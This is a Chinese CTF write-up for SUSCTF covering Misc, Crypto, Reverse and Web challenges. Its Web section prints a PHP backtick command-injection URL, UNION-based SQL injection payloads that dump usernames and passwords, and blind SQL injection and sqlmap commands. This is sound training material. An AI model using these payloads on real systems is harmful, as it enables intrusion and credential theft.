<h4 id="Misc-温柔点"><a href="#Misc-温柔点" class="headerlink" title="[Misc]温柔点"></a>[Misc]温柔点</h4><p>打开dic发现是字典，QAQ是需要密码的，所以考虑用该字典爆破</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030114032673.png" alt="image-20211030114032673"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030114114451.png" alt="image-20211030114114451"></p>
<p><code>SUSCTF&#123;su7h_A_vi0lent_Guy&#125;</code></p>
<h4 id="Misc-flsehida"><a href="#Misc-flsehida" class="headerlink" title="[Misc]flsehida"></a>[Misc]flsehida</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1           0 LOAD_CONST               0 (&#x27;RPRBQ?z?I@RMVLADVNLQMVU\\Bx&#x27;)</span><br><span class="line">            2 STORE_NAME               0 (a)</span><br><span class="line"></span><br><span class="line">2           4 LOAD_CONST               1 (&#x27;&#x27;)</span><br><span class="line">            6 STORE_NAME               1 (b)</span><br><span class="line"></span><br><span class="line">3           8 LOAD_NAME                2 (enumerate)</span><br><span class="line">           10 LOAD_NAME                0 (a)</span><br><span class="line">           12 CALL_FUNCTION            1</span><br><span class="line">           14 GET_ITER</span><br><span class="line">      &gt;&gt;   16 FOR_ITER                44 (to 62)</span><br><span class="line">           18 UNPACK_SEQUENCE          2</span><br><span class="line">           20 STORE_NAME               3 (i)</span><br><span class="line">           22 STORE_NAME               4 (value)</span><br><span class="line"></span><br><span class="line">4          24 LOAD_NAME                5 (ord)</span><br><span class="line">           26 LOAD_NAME                4 (value)</span><br><span class="line">           28 CALL_FUNCTION            1</span><br><span class="line">           30 STORE_NAME               6 (c)</span><br><span class="line"></span><br><span class="line">5          32 LOAD_NAME                6 (c)</span><br><span class="line">           34 LOAD_CONST               2 (2)</span><br><span class="line">           36 BINARY_ADD</span><br><span class="line">           38 STORE_NAME               6 (c)</span><br><span class="line"></span><br><span class="line">6          40 LOAD_NAME                6 (c)</span><br><span class="line">           42 LOAD_CONST               3 (7)</span><br><span class="line">           44 BINARY_XOR</span><br><span class="line">           46 STORE_NAME               6 (c)</span><br><span class="line"></span><br><span class="line">7          48 LOAD_NAME                1 (b)</span><br><span class="line">           50 LOAD_NAME                7 (chr)</span><br><span class="line">           52 LOAD_NAME                6 (c)</span><br><span class="line">           54 CALL_FUNCTION            1</span><br><span class="line">           56 INPLACE_ADD</span><br><span class="line">           58 STORE_NAME               1 (b)</span><br><span class="line">           60 JUMP_ABSOLUTE           16</span><br><span class="line"></span><br><span class="line">8     &gt;&gt;   62 LOAD_NAME                8 (print)</span><br><span class="line">           64 LOAD_NAME                1 (b)</span><br><span class="line">           66 CALL_FUNCTION            1</span><br><span class="line">           68 POP_TOP</span><br><span class="line">           70 LOAD_CONST               4 (None)</span><br><span class="line">           72 RETURN_VALUE</span><br></pre></td></tr></table></figure>
<p>根据字节码逆向可得</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t</span>():</span></span><br><span class="line">    a = <span class="string">&#x27;RPRBQ?z?I@RMVLADVNLQMVU\\Bx&#x27;</span></span><br><span class="line">    b = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">        c = <span class="built_in">ord</span>(value)</span><br><span class="line">        c = c + <span class="number">2</span></span><br><span class="line">        c = c ^ <span class="number">7</span></span><br><span class="line">        b += <span class="built_in">chr</span>(c)</span><br><span class="line">        <span class="built_in">print</span>(b)</span><br><span class="line">dis.dis(t)</span><br></pre></td></tr></table></figure>
<p>执行函数t，有</p>
<p><code>SUSCTF&#123;FLESH_IDA_WITH_PYC&#125;</code></p>
<h4 id="Misc-盲生你发现了华点"><a href="#Misc-盲生你发现了华点" class="headerlink" title="[Misc]盲生你发现了华点"></a>[Misc]盲生你发现了华点</h4><p><img src="/2021/11/01/Hulu-WP/image-20211031212454679.png" alt="image-20211031212454679"></p>
<p>将文件名改为flag.zip然后解压缩，进入flag.docx</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031212534565.png" alt="image-20211031212534565"></p>
<h4 id="Misc-What"><a href="#Misc-What" class="headerlink" title="[Misc]What?"></a>[Misc]What?</h4><p>拖进010查看发现该文件字节流是逆序的PNG</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030214957162.png" alt="image-20211030214957162"></p>
<p>逆序生成png</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> m:</span><br><span class="line">    m.write(binascii.b2a_hex(f))</span><br><span class="line">tmp = <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">tmp = tmp[::-<span class="number">1</span>]</span><br><span class="line">new = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tmp), <span class="number">2</span>):</span><br><span class="line">    new += tmp[i+<span class="number">1</span>]</span><br><span class="line">    new += tmp[i]</span><br><span class="line"><span class="built_in">print</span>(new)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> result:</span><br><span class="line">    result.write(binascii.a2b_hex(new))</span><br></pre></td></tr></table></figure>
<p>Linux环境打开提示CRC错误，进行CRC爆破，参考<a href="https://www.cnblogs.com/vict0r/p/13258286.html">https://www.cnblogs.com/vict0r/p/13258286.html</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">img = <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFFFF</span>):</span><br><span class="line">    stream = img[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + img[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc = binascii.crc32(stream)</span><br><span class="line">    <span class="keyword">if</span> crc == bytes_to_long(img[<span class="number">29</span>:<span class="number">33</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br></pre></td></tr></table></figure>
<p>成功打开</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030221804924.png" alt="image-20211030221804924"></p>
<p><code>S&#123;YTUGO_SOUICO_TTDG!F_O&#125;</code></p>
<p>栅栏密码每组6字符解密</p>
<p><code>SUSCTF&#123;GOOD_YOU_GOT_IT!&#125;</code></p>
<h4 id="Misc-悲惨世界"><a href="#Misc-悲惨世界" class="headerlink" title="[Misc]悲惨世界"></a>[Misc]悲惨世界</h4><p><img src="/2021/11/01/Hulu-WP/image-20211031015828364.png" alt="image-20211031015828364"></p>
<p><code>20 83 85 83 67 84 70 20 16 188 16 68 79 67 16 73 85 8 51 16 85 78 68 69 82 20 89 20 79 85 82 16 75 96 8 69 37 78 69 39 16 110</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Caps SUSCTF Caps Shift &lt; Doc IU Backspace 3 shift Under Caps Y Caps our Shift K 0 Backspace e leftarrow n e rightarrow Shift &gt;</span><br><span class="line">大写锁定 SUSCTF 取消大写锁定 &lt;DocI3Under 大写锁定 Y 取消大写锁定 our Shift Knee&gt;</span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&lt;DocI3UnderYourKnee&gt;</code></p>
<h4 id="Misc-调查问卷"><a href="#Misc-调查问卷" class="headerlink" title="[Misc]调查问卷"></a>[Misc]调查问卷</h4><p>填完就有，忘了记录。。</p>
<h4 id="Crypto-babyflower"><a href="#Crypto-babyflower" class="headerlink" title="[Crypto]babyflower"></a>[Crypto]babyflower</h4><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HFHXGU&#123;S3ool_XIBKG0~&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Crypto-ezpy"><a href="#Crypto-ezpy" class="headerlink" title="[Crypto]ezpy"></a>[Crypto]ezpy</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> randomfrom Crypto.Util.number <span class="keyword">import</span> *<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AESfrom binascii <span class="keyword">import</span> b2a_hex, a2b_hex flag1 = <span class="string">&quot;*********&quot;</span>key = <span class="string">&#x27;llggwwcryptoyyds&#x27;</span>mode = AES.MODE_OFBcryptor = AES.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), mode, <span class="string">b&#x27;0000000000000000&#x27;</span>)length = 16count = <span class="built_in">len</span>(flag1)<span class="keyword">if</span> count % length != <span class="number">0</span>:    add = length - (count % length)<span class="keyword">else</span>:    add = 0message = flag1 + (<span class="string">&#x27;\0&#x27;</span> * add)ciphertext = cryptor.encrypt(message.encode(<span class="string">&#x27;utf-8&#x27;</span>))result = b2a_hex(ciphertext) <span class="built_in">print</span>(result.decode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment"># b6e4122d658a39d8fa3da7369e1f6dc2  flag2 = b&#x27;*********&#x27;n = 2 ** 256flaglong = bytes_to_long(flag2)m = random.randint(2, n-1) | 1c = pow(m, flaglong, n)print(&#x27;m = &#x27; + str(m))print(&#x27;c = &#x27; + str(c))# m = 83862941474000352622736856571533270468192196205332529383208031858169966457039# c = 93540468044159507877580535912312883151967317672005767396221829672116391895425</span></span><br></pre></td></tr></table></figure>
<p>解密程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hexfrom Crypto.Util.number <span class="keyword">import</span> *<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AESfrom sympy.ntheory <span class="keyword">import</span> discrete_logkey = <span class="string">&#x27;llggwwcryptoyyds&#x27;</span>mode = AES.MODE_OFBcryptor = AES.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), mode, <span class="string">b&#x27;0000000000000000&#x27;</span>)result = <span class="string">b&#x27;b6e4122d658a39d8fa3da7369e1f6dc2&#x27;</span>ciphertext = a2b_hex(result)message = cryptor.decrypt(ciphertext)<span class="built_in">print</span>(message)<span class="comment"># flag1=SUSCTF&#123;Dooo_Um = 83862941474000352622736856571533270468192196205332529383208031858169966457039c = 93540468044159507877580535912312883151967317672005767396221829672116391895425n = 2 ** 256flaglong = discrete_log(n, c, m)print(long_to_bytes(flaglong))# _lik3_MATH</span></span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;Dooo_U_lik3_MATH&#125;</code></p>
<h4 id="Crypto-ezcipher"><a href="#Crypto-ezcipher" class="headerlink" title="[Crypto] ezcipher"></a>[Crypto] ezcipher</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YBYNYLBNLMMNNBNYYLYNBLLBBNYNNB</span><br></pre></td></tr></table></figure>
<p>棋盘密码<a href="https://www.zhihu.com/question/351591291">https://www.zhihu.com/question/351591291</a></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101140658628.png" alt="image-20211101140658628"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Y  B  Y  N  Y  L  B  N  L  M  M  N  N  B  N  Y  Y  L  Y  N  B  L  L  B  B  N  Y  N  N  B54 12 54 33 54 31 12 33 31 32 32 33 33 12 33 54 54 31 54 33 12 31 31 12 12 33 54 33 33 12</span><br></pre></td></tr></table></figure>
<p>好像不对。。</p>
<p>参考:找到安恒杯也是棋盘密码可直接替换<a href="https://www.jianshu.com/p/4e70e35ceb72">https://www.jianshu.com/p/4e70e35ceb72</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertoolskey = []cipher = <span class="string">&#x27;YBYNYLBNLMMNNBNYYLYNBLLBBNYNNB&#x27;</span><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">&#x27;YBNLM&#x27;</span>,<span class="number">5</span>):    key.append(<span class="string">&#x27;&#x27;</span>.join(i))                  <span class="comment">#得到所有的密钥情况for now_key in key:    solve_c = &quot;&quot;    res = &quot;&quot;    for now_c in cipher:        solve_c += str(now_key.index(now_c))      #得出密文所在当前密钥中的位置    for i in range(0, len(solve_c), 2):        now_ascii = int(solve_c[i])*5+int(solve_c[i+1])+97        #进行计算，得到每两个密文所对应的ascii明文        if now_ascii &gt; ord(&#x27;i&#x27;):      #解决密钥矩阵中使用i替代j的问题            now_ascii += 1        res += chr(now_ascii)    print(now_key, res)</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/01/Hulu-WP/image-20211101151001453.png" alt="image-20211101151001453"></p>
<p><code>SUSCTF&#123;POLYBIUSLOVEYOU&#125;</code></p>
<h4 id="Crypto-justrsa"><a href="#Crypto-justrsa" class="headerlink" title="[Crypto]justrsa"></a>[Crypto]justrsa</h4><p>大数分解得pq，然后常规解密即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *<span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invertn = 1478515719392936710044850615656034941194767475153371243813090897713762117025516403232117859c = 635346483268607041765081653692316846690674938281834040872188948517632743897309531894345982p = 1189178925631355931121267082092052579422610141q = 1243308040131948020098646528246081477629607999e = 65537d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))m = <span class="built_in">pow</span>(c, d, n)<span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;W3_faCt0r_1t!!!&#125;</code></p>
<h4 id="Crypto-社会主义核心价值观"><a href="#Crypto-社会主义核心价值观" class="headerlink" title="[Crypto]社会主义核心价值观"></a>[Crypto]社会主义核心价值观</h4><p><a href="http://www.hiencode.com/cvencode.html">http://www.hiencode.com/cvencode.html</a> 解码</p>
<p><code>SUSCTF&#123;Red_R3d_And_Red_We_ALl_reD&#125;</code></p>
<h4 id="Reverse-babyre"><a href="#Reverse-babyre" class="headerlink" title="[Reverse]babyre"></a>[Reverse]babyre</h4><p><img src="/2021/11/01/Hulu-WP/image-20211030202502919.png" alt="image-20211030202502919"></p>
<p>aa数组内容</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030202518005.png" alt="image-20211030202518005"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">aa = [<span class="number">0x73</span>, <span class="number">6</span>, <span class="number">0x75</span>, <span class="number">0x16</span>, <span class="number">0x62</span>, <span class="number">4</span>, <span class="number">0x7F</span>, <span class="number">0x1C</span>, <span class="number">0x74</span>, <span class="number">0x21</span>, <span class="number">0x7E</span>, <span class="number">0x0A</span>,      <span class="number">0x3B</span>, <span class="number">0x64</span>, <span class="number">0x2C</span>, <span class="number">0x6D</span>, <span class="number">0x5D</span>, <span class="number">2</span>, <span class="number">0x6E</span>, <span class="number">0x5D</span>, <span class="number">0x14</span>, <span class="number">0x4B</span>, <span class="number">0x2A</span>, <span class="number">0x57</span>]s = [aa[<span class="number">0</span>]]tmp = 0<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(aa)):    tmp ^= s[i-<span class="number">1</span>]    s.append(tmp ^ aa[i])<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)):    tmp = s[i]    <span class="keyword">if</span> <span class="number">64</span> &lt; tmp - <span class="number">32</span> &lt;= <span class="number">90</span>:        s[i] -= <span class="number">32</span>    <span class="keyword">if</span> <span class="number">96</span> &lt; tmp + <span class="number">32</span> &lt;= <span class="number">122</span>:        s[i] += 32flag = <span class="string">&quot;&quot;</span><span class="keyword">for</span> i <span class="keyword">in</span> s:    flag += <span class="built_in">chr</span>(i)<span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;CHu_T1_ha0_L3i_A&#125;</code></p>
<h4 id="Reverse-whitegive"><a href="#Reverse-whitegive" class="headerlink" title="[Reverse]whitegive"></a>[Reverse]whitegive</h4><p>ida发现跳转指令不触发，应为<code>jb</code>才对，修改一下汇编命令</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101135910270.png" alt="image-20211101135910270"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101135931830.png" alt="image-20211101135931830"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101140001024.png" alt="image-20211101140001024"></p>
<p>存入源文件</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101140051610.png" alt="image-20211101140051610"></p>
<p>参考 <a href="https://www.pianshen.com/article/87171941467/，打开exe即可">https://www.pianshen.com/article/87171941467/，打开exe即可</a></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101135755344.png" alt="image-20211101135755344"></p>
<p> <code>SUSCTF&#123;UFVTKFKGeEKwT&#125;</code></p>
<h4 id="Reverse-eeeasyre"><a href="#Reverse-eeeasyre" class="headerlink" title="[Reverse]eeeasyre"></a>[Reverse]eeeasyre</h4><p>先用upx脱壳</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030224611460.png" alt="image-20211030224611460"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030230628168.png" alt="image-20211030230628168"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030230639992.png" alt="image-20211030230639992"></p>
<p><code>SUSCTF&#123;RE_IS_FUN_!&#125;</code></p>
<h4 id="Reverse-babyida"><a href="#Reverse-babyida" class="headerlink" title="[Reverse]babyida"></a>[Reverse]babyida</h4><p>ida搜索flag</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030114942243.png" alt="image-20211030114942243"></p>
<p><code>SUSCTF&#123;ea5y_1da_u5e&#125;</code></p>
<h4 id="Reverse-点开即送"><a href="#Reverse-点开即送" class="headerlink" title="[Reverse]点开即送"></a>[Reverse]点开即送</h4><p><img src="/2021/11/01/Hulu-WP/image-20211031110225496.png" alt="image-20211031110225496"></p>
<p><code>5355534354467b536f6f6f5f656173797d</code>转ASCII<code>SUSCTF&#123;Sooo_easy&#125;</code></p>
<h4 id="Reverse-ezpyc"><a href="#Reverse-ezpyc" class="headerlink" title="[Reverse]ezpyc"></a>[Reverse]ezpyc</h4><p><a href="https://tool.lu/pyc/反编译得到">https://tool.lu/pyc/反编译得到</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport base64import timeprint(&#x27;\xe4\xbd\xa0\xe5\xa5\xbd\xe5\x91\x80\xef\xbc\x8c\xe8\xbf\x98\xe6\x9c\x89\xe4\xb8\xa4\xe5\xa4\xa9\xe8\xa6\x81\xe5\x8a\xa0\xe6\xb2\xb9\xe5\x95\x8a~&#x27;)print(&#x27;\xe5\x8f\xaf\xe6\x98\xaf\xe8\xbf\x99\xe4\xb8\xaaexe\xe5\xa5\xbd\xe5\xa5\x87\xe6\x80\xaa\xe5\x95\x8a\xe3\x80\x82\xe3\x80\x82\xe3\x80\x82&#x27;)flag = b&#x27;*******************&#x27;flag = base64.b32encode(flag)time.sleep(500)print(flag)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd\xe5\x91\x80\xef\xbc\x8c\xe8\xbf\x98\xe6\x9c\x89\xe4\xb8\xa4\xe5\xa4\xa9\xe8\xa6\x81\xe5\x8a\xa0\xe6\xb2\xb9\xe5\x95\x8a~\xe5\x8f\xaf\xe6\x98\xaf\xe8\xbf\x99\xe4\xb8\xaaexe\xe5\xa5\xbd\xe5\xa5\x87\xe6\x80\xaa\xe5\x95\x8a\xe3\x80\x82\xe3\x80\x82\xe3\x80\x82&#x27;</span>flag = base64.b32encode(flag)<span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4S62BZNFXXSZDAHPXSGORP4Y42OITZFYUTS2JKPIU2A6LCVA42ZLTZMVRJ7OLD5P42MK72F7THSLRKTFPBS6LJN54WSYPZUAVLSZLCXDQCBOHAEC4OAIE===</span><br></pre></td></tr></table></figure>
<p>Base32解码是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你好呀，还有两天要加油啊~可是这个exe好奇怪啊。。。</span><br></pre></td></tr></table></figure>
<p>更新附件后反编译结果为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport base64flag = &#x27;************************&#x27;flag = base64.b32encode(flag)print &#x27;your flag: IRDEINCFG5GGEYDHJNDEAM2GJAZD6S2GIBFDMPJWJY======&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Base32解码加ROT47</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101143222354.png" alt="image-20211101143222354"></p>
<p><code>susctf&#123;318zuobuwanzuoyele&#125;</code></p>
<h4 id="Web-justeval"><a href="#Web-justeval" class="headerlink" title="[Web]justeval"></a>[Web]justeval</h4><p>参考<a href="https://www.cnblogs.com/luocodes/p/14014947.html">https://www.cnblogs.com/luocodes/p/14014947.html</a></p>
<p>PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://223.3.85.86:15926/?a=echo `base64 flag.php`;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eW91IGNhbiBub3Qgc2VlIGl0IQo8P3BocAovL1NVU0NURntQSFBfMXNfczBfZTRzeSF9	</span><br></pre></td></tr></table></figure>
<p>base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">you can not see it!&lt;?php//SUSCTF&#123;PHP_1s_s0_e4sy!&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Web-asoul-icu"><a href="#Web-asoul-icu" class="headerlink" title="[Web]asoul.icu"></a>[Web]asoul.icu</h4><p>循环获取弹窗内容，文本中含有<code>SUSCTF</code>就打印出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriverdriver = webdriver.Chrome()driver.get(<span class="string">&quot;http://223.3.85.86:10010&quot;</span>)<span class="keyword">while</span> <span class="literal">True</span>:    a = driver.switch_to.alert    <span class="keyword">if</span> <span class="string">&quot;SUSCTF&quot;</span> <span class="keyword">in</span> a.text:        <span class="built_in">print</span>(a.text)        <span class="keyword">break</span>    <span class="keyword">else</span>:        <span class="keyword">try</span>:            driver.refresh()        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:            <span class="built_in">print</span>(<span class="string">&quot;Exception found&quot;</span>, <span class="built_in">format</span>(e))</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/01/Hulu-WP/image-20211030152440768.png" alt="image-20211030152440768"></p>
<p><code>SUSCTF&#123;n4iln_d3_jio_xi4oxiaoDe_X14ngxiangde&#125;</code></p>
<h4 id="Web-easy-sql"><a href="#Web-easy-sql" class="headerlink" title="[Web]easy sql"></a>[Web]easy sql</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union select database(),user()#</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/01/Hulu-WP/image-20211031002005555.png" alt="image-20211031002005555"></p>
<p>查看表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/01/Hulu-WP/image-20211031002902104.png" alt="image-20211031002902104"></p>
<p>查字段名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union select group_concat(column_name),2 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/01/Hulu-WP/image-20211031002933645.png" alt="image-20211031002933645"></p>
<p>联合查询username和password</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;union select group_concat(username,&#x27;</span><span class="comment">--&#x27;,password),2 from users#</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/01/Hulu-WP/image-20211031003101037.png" alt="image-20211031003101037"></p>
<p><code>SUSCTF&#123;th1s_1s_y0ur_flag&#125;</code></p>
<h4 id="Web-BindSQL"><a href="#Web-BindSQL" class="headerlink" title="[Web]BindSQL"></a>[Web]BindSQL</h4><p>参考 <a href="https://www.freebuf.com/articles/web/281559.html">https://www.freebuf.com/articles/web/281559.html</a></p>
<p><code>1&#39;and 1=1 union select 1,2#</code></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101172811620.png" alt="image-20211101172811620"></p>
<p><code>admin&#39; and (length(database()))=3#</code></p>
<p><code>admin&#39; and ascii(substr(database(),1,1))=1#</code>用burp suite爆破<strong>数据库</strong>第一位为99，也即c</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101174606486.png" alt="image-20211101174606486"></p>
<p>第二位116，也即t</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101174705299.png" alt="image-20211101174705299"></p>
<p>第三位102，也即f</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101174821892.png" alt="image-20211101174821892"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=1#</span><br></pre></td></tr></table></figure>
<p>第一位117即u</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101175216346.png" alt="image-20211101175216346"></p>
<p>以此类推得到表名为user，</p>
<p>爆破字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and (ascii(substr((select column_name from information_schema.columns where table_name=&#x27;user&#x27; limit 1,1),1,1)))=0#</span><br></pre></td></tr></table></figure>
<p>得到<code>User</code></p>
<p>猜内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and (ascii(substr(( select flaglo from User limit 0,1),1,1)))=0#</span><br></pre></td></tr></table></figure>
<p>User无内容</p>
<p>好像不太对。。。试试sqlmap吧</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -r safe.txt --dbs</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/01/Hulu-WP/image-20211101181443004.png" alt="image-20211101181443004"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -r safe.txt -D ctf --tables</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/01/Hulu-WP/image-20211101181657150.png" alt="image-20211101181657150"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101181744409.png" alt="image-20211101181744409"></p>
<p>以此类推</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211101181837645.png" alt="image-20211101181837645"></p>
<p><code>SUSCTF&#123;not_v3ry_h4rd_Uh_huh&#125;</code></p>
<h4 id="Web-copy"><a href="#Web-copy" class="headerlink" title="[Web]copy"></a>[Web]copy</h4><p>F12，复制后Base64解码</p>
